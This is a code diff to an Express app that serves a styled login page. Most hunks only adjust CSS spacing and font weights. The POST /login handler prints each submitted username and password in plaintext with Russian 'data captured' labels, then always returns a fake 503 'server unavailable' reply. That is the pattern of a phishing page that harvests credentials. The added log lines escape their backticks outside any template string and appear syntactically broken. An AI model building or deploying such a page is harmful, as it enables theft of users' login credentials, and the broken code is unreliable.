@@ -31,7 +31,7 @@ app.get('/', (req, res) => {
 
         .auth-container { 
             background-color: #23252b;
-            padding: 40px 32px 36px; 
+            padding: 34px 32px 30px; 
             border-radius: 12px; 
             width: 100%;
             max-width: 400px; 
@@ -40,21 +40,22 @@ app.get('/', (req, res) => {
         h1 {
             color: #ffffff; 
             text-align: center; 
-            margin-bottom: 28px; 
-            font-size: 28px; 
-            font-weight: 700; 
+            margin-bottom: 24px; 
+            font-size: 27px; 
+            font-weight: 800; 
             letter-spacing: -0.4px;
         }
 
         .input-control { 
             width: 100%; 
-            padding: 14px 16px; 
-            margin-bottom: 14px; 
+            padding: 13px 16px; 
+            margin-bottom: 12px; 
             background-color: #2d3038;
             border: 1px solid #3a3e47; 
             border-radius: 8px; 
             color: #ffffff; 
             font-size: 15px; 
+            font-weight: 500;
             transition: all 0.15s ease; 
         }
 
@@ -70,16 +71,16 @@ app.get('/', (req, res) => {
 
         .btn-submit { 
             width: 100%; 
-            padding: 13px; 
+            padding: 12px; 
             background-color: transparent; 
             border: 1.5px solid #ffffff; 
             border-radius: 8px; 
             color: #ffffff; 
             font-size: 16px; 
-            font-weight: 600; 
+            font-weight: 700; 
             cursor: pointer; 
-            margin-top: 4px;
-            margin-bottom: 22px; 
+            margin-top: 2px;
+            margin-bottom: 18px; 
             transition: background-color 0.15s ease; 
         }
         
@@ -92,9 +93,9 @@ app.get('/', (req, res) => {
             text-align: center; 
             color: #ffffff; 
             font-size: 14.5px; 
-            font-weight: 500; 
+            font-weight: 600; 
             text-decoration: none; 
-            margin-bottom: 24px; 
+            margin-bottom: 20px; 
         }
 
         .link-text:hover { 
@@ -104,19 +105,19 @@ app.get('/', (req, res) => {
         .secondary-actions { 
             display: flex;
             flex-direction: column;
-            gap: 12px;
-            margin-bottom: 26px;
+            gap: 10px;
+            margin-bottom: 22px;
         }
 
         .btn-secondary { 
             width: 100%; 
-            padding: 14px; 
+            padding: 13px; 
             background-color: #2d3038; 
             border: none; 
             border-radius: 8px; 
             color: #ffffff; 
             font-size: 15px; 
-            font-weight: 500; 
+            font-weight: 600; 
             cursor: pointer; 
             transition: background-color 0.15s ease; 
         }
@@ -129,13 +130,13 @@ app.get('/', (req, res) => {
             text-align: center;
             color: #ffffff;
             font-size: 14.5px;
-            font-weight: 500;
+            font-weight: 600;
         }
 
         .signup-text a {
             color: #ffffff;
             text-decoration: none;
-            font-weight: 600;
+            font-weight: 700;
         }
 
         .signup-text a:hover {
@@ -173,11 +174,11 @@ app.post('/login', (req, res) => {
     const userLogin = req.body.username;
     const userPassword = req.body.password;
     
-    console.log(`\n========================================`);
-    console.log(`[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
-    console.log(`ВВЕДЕННЫЙ ЛОГИН: ${userLogin}`);
-    console.log(`ВВЕДЕННЫЙ ПАРОЛЬ: ${userPassword}`);
-    console.log(`========================================`);
+    console.log(\`\\n========================================\`);
+    console.log(\`[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:\`);
+    console.log(\`ВВЕДЕННЫЙ ЛОГИН: \${userLogin}\`);
+    console.log(\`ВВЕДЕННЫЙ ПАРОЛЬ: \${userPassword}\`);
+    console.log(\`========================================\`);
     
     res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
 });
